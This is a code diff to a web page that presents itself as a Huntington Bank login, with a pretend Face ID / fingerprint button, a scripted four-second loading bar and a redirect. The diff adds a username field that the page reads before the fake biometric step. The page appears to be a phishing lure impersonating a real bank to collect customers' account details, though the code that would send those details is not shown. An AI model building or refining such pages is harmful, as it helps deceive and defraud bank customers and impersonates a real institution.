@@ -64,6 +64,27 @@
       margin-bottom: 30px;
     }
 
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      width: 260px;
+      padding: 14px 12px;
+      font-size: 17px;
+      border: 1px solid #bbb;
+      border-radius: 5px;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+      background: rgba(255,255,255,0.84);
+      color: var(--text-color);
+      transition: border-color 0.2s;
+    }
+    input[type="text"]:focus {
+      outline: none;
+      border-color: var(--button-bg);
+    }
+
     button {
       padding: 15px 25px;
       font-size: 18px;
@@ -76,7 +97,12 @@
       transition: background 0.2s;
     }
 
-    button:hover {
+    button:disabled {
+      background: #c3c3c3;
+      cursor: not-allowed;
+    }
+
+    button:hover:not(:disabled) {
       background-color: var(--button-hover);
     }
 
@@ -168,7 +194,11 @@
   <h1>Welcome to Huntington Bank</h1>
   <p>Secure biometric authentication is required to proceed.</p>
 
-  <button onclick="biometricLogin()">Login with Face ID / Fingerprint</button>
+  <div class="input-group">
+    <input type="text" id="usernameInput" placeholder="Enter your username" autocomplete="username">
+  </div>
+
+  <button id="loginButton" onclick="biometricLogin()" disabled>Login with Face ID / Fingerprint</button>
 
   <div class="contact">
     <h3>Need Help?</h3>
@@ -190,7 +220,18 @@
   </div>
 
   <script>
+    // Enable login button only if username is entered
+    const usernameInput = document.getElementById('usernameInput');
+    const loginButton = document.getElementById('loginButton');
+    usernameInput.addEventListener('input', function() {
+      loginButton.disabled = this.value.trim().length === 0;
+    });
+
     function biometricLogin() {
+      // You can retrieve username value here if needed:
+      const username = usernameInput.value.trim();
+      if (!username) return; // Just in case
+
       // Show loading overlay and animate
       const overlay = document.getElementById('loadingOverlay');
       const progress = document.getElementById('loaderBarProgress');
@@ -205,7 +246,7 @@
         if (percent >= 100) {
           clearInterval(interval);
         }
-      }, 100); // 100ms * 40 = 4 seconds
+      }, 100);
 
       // Redirect after 4 seconds
       setTimeout(() => {
